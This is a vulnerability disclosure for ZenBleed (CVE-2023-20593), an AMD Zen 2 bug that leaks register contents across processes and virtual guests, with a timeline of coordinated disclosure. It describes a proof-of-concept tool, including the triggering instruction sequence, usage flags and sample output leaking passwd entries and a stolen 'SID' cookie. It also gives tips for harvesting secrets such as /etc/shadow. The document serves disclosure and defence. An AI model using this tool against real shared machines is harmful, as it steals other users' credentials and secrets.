# The VZEROUPPER Instruction on AMD Zen 2 can Leak Register File State
<p><sup>aka "ZenBleed", CVE-2023-20593</sup></p>
<p align="right">
Tavis Ormandy<br/>
Eduardo Vela Nava<br/>
Josh Eads<br/>
Alexandra Sandulescu<br/>
</p>

## Introduction

The `VZEROUPPER` instruction can be used to zero the upper 128 bits of the YMM
registers. The architecture documentation recommends using it to eliminate any
performance penalties caused by false dependencies when transitioning between
AVX and SSE modes.

We have discovered cases where the effects of a speculatively executed
`VZEROUPPER` are incorrectly rolled back following a branch misprediction[^2].

This issue has severe security consequences and is easily exploitable. To
illustrate this, we have developed a reliable method of leaking register
contents across concurrent processes, hyper threads and virtualized guests.

This is not a timing attack or sidechannel, the register contents
can simply be read directly.

We have confirmed this bug is reproducible on at least the following SKUs:

- `AMD Ryzen Threadripper PRO 3945WX 12-Cores`
- `AMD Ryzen 7 PRO 4750GE with Radeon Graphics`
- `AMD Ryzen 7 5700U`
- `AMD EPYC 7B12`

In general, we believe all Zen 2 processors are affected, including "Rome"
server-class processors at the latest microcode patchlevel at the time of
writing.

This flaw is not dependent on any particular operating system, all operating
systems are affected.

## Details

We have found the following short sequence[^3] will create a dependency between
overlapping xmm and ymm registers due to XMM register merge optimization[^1].

```
vcvtsi2s{s,d}   xmm, xmm, r64
vmovupd         ymm, ymm
```

This instruction should now clear that dependency:

```
vzeroupper
```

However, we have discovered that when a branch misprediction is detected and
the operation is rolled back, it will leave the register in an undefined state.

```
    jcc          overzero
    vzeroupper
overzero:
    nop
```

### Impact

The undefined portion of our ymm register will contain random data from the
register file. The register file is a resource shared by all processes, threads
(i.e. hyperthreads) and virtualized guests on the same physical core.

The practical result is that you can read the registers of other processes.

> Note that this is not a timing attack or a side channel, the full values can
> simply be read as fast as you can access them.

We have developed a tool called `zenbleed` to help reproduce and explore this
issue.


#### Reproducing

Please type `make` to build the testcase.

```
$ ./zenbleed -h
*** EMBARGOED SECURITY ISSUE --  DO NOT DISTRIBUTE! ***
ZenBleed Testcase -- taviso@google.com

NOTE: Try -h to see configuration options

Usage: ./zenbleed [OPTIONS]
   -v N    Select a variant leak kernel, different kernels work better on different SKUs.
   -m N    Stop after leaking N values, useful for benchmarking.
   -H N    Spawn a 'hammer' thread on core N, produces recognizable values for testing.
   -t N    Give up after this many seconds.
   -n N    Set nice level, can improve results on some systems.
   -a      Print all data, not just ASCII strings.
   -s      Only print the magic hammer value (used for benchmarking).
   -p STR  Pattern mode, try to continue string STR based on sampling leaked values.
   -q      Quiet, reduce verbosity.
   -h      Print this message
```

> If you're testing an active system, just running `./zenbleed` on a vulnerable system should produce *significant* output.

If you're testing a quiet server, you may need to generate some activity.

For example, a command like `while true; do sort < /etc/passwd > /dev/null; done`.

This should generate some recognizable register throughput, like this:

```
$ ./zenbleed
Thread 0x7f26b92346c0 running on CPU 0
Thread 0x7f26b8a336c0 running on CPU 2
Thread 12: "999:999:systemd "
Thread 12: ":Gnome Display M"
Thread 12: "sr/sbin/nologin "
Thread 12: "ent daemon,,,:/v"
Thread 12: "S daemon,,,:/run"
Thread 12: "System (admin):/"
Thread 12: "sr/sbin/nologin "
Thread 12: "lseAudio daemon,"
Thread 12: "sr/sbin/nologin "
Thread 12: "999:999:systemd "
Thread 12: "sr/sbin/nologin "
Thread 12: "/run/speech-disp"
Thread 12: "sr/sbin/nologin "
Thread 12: "Dispatcher,,,:/r"
Thread 12: "edebian:x:1000:"
Thread 12: "Dispatcher,,,:/r"
Thread 12: "/root:/bin/bash "
Thread 12: "System (admin):/"
Thread 12: "ent daemon,,,:/v"
Thread 12: ":Gnome Display M"
Thread 08: "lseAudio daemon,"
Thread 08: "ent daemon,,,:/v"
Thread 08: "sr/sbin/nologin "
Thread 08: "lseAudio daemon,"
```

This demonstrates that you can read the registers of other processes.

The AVX registers are often used for high performance string processing by
system libraries. This means that very high volumes of sensitive data pass
through them.

##### Advanced Usage

The `zenbleed` tool has multiple options for investigating this vulnerability.

> By default, zenbleed only prints ASCII. If you want to see all values, use
> the option `-a`.

###### Pattern Mode

Pattern mode attempts to automatically reconstruct secrets and passwords.

This works best against software that continuously moves a lot of strings
around, such as web browsers, busy servers, and so on.

For example, imagine that we would like to steal a cookie called `SID` from a
browser session.

You could run `./zenbleed -qp "SID="` and `zenbleed` will attempt to monitor
registers for a string that looks like that. As it learns more of the string
that follows, it will extend the search to continue the pattern.

```
$ ./zenbleed -q -p "SID="
SID=cieX4meceechoo2UThooh5uu; 1P_JAR=2023-05-17-21; S^C
```

This can be used to passively monitor for passwords, keys, secrets, and so on.

- Shorter patterns seem to work better, 4-5 characters, but you can try longer.
- It may take some time to make progress, especially against idle targets.
- If the process stalls or the output looks incorrect, hit ^C and try again.

> This may not always be reliable, it's a very simple heuristic.

Another example attack would be trying to reconstruct `/etc/shadow`, by running
a setuid utility like `passwd` or `chage`.

###### Hammer Mode

Hammer mode spawns a thread on the specified core that continually inserts
recognizable values into registers. This is useful for debugging and
benchmarking.

###### Benchmarking

It is strongly recommended to run the `./bechmark.sh` script to optimize the
tool for the specific SKU you are testing.

This script tests various timings and chooses the optimal settings.

### Analysis

No system calls or special privileges are required to exploit this flaw.

In a cloud computing environment, an unprivileged guest can use this flaw to
monitor activities on the host, or other guests on the same physical core.

### Solution

AMD have released a hot-loadable microcode patch to address this issue.

### Credit

This bug was discovered by Tavis Ormandy of Google Information Security Engineering.

Additional analysis was provided by Eduardo Vela Nava, Alexandra Sandulescu,
and Josh Eads.

### Timeline

- `2023-05-09` A component of our CPU validation pipeline generates an anomalous result.
- `2023-05-12` We successfully isolate and reproduce the issue. Investigation continues.
- `2023-05-14` We are now aware of the scope and severity of the issue.
- `2023-05-15` We draft a brief status report and share our findings with AMD PSIRT.
- `2023-05-17` AMD acknowledge our report and confirm they can reproduce the issue.
- `2023-05-17` We complete development of a reliable PoC and share it with AMD.
- `2023-05-19` We begin to notify major kernel and hypervisor vendors.
- `2023-05-23` We receive a beta microcode update for Rome from AMD.
- `2023-05-24` We confirm the update fixes the issue and notify AMD.
- `2023-05-30` AMD inform us they have sent a SN (security notice) to partners.
- `2023-06-12` Meeting with AMD to discuss status and details.
- `2023-07-20` AMD unexpectedly publish patches, earlier than an agreed embargo date.
- `2023-07-21` As the fix is now public, we propose privately notifying major
               distributions that they should begin preparing updated firmware
               packages.
- `2023-07-24` Public disclosure.

### References

[^1]: Software Optimization Guide for AMD Processors, available [here](https://www.amd.com/en/support/tech-docs/software-optimization-guide-for-amd-family-17h-models-30h-and-greater-processors).
[^2]: Technically, this does not have to be a conditional branch due to [SLS](https://grsecurity.net/amd_branch_mispredictor_part_2_where_no_cpu_has_gone_before).
[^3]: There are several known variants of this sequence, including `vpinsr{b,d}` and `cvtpi2pd`, among others.
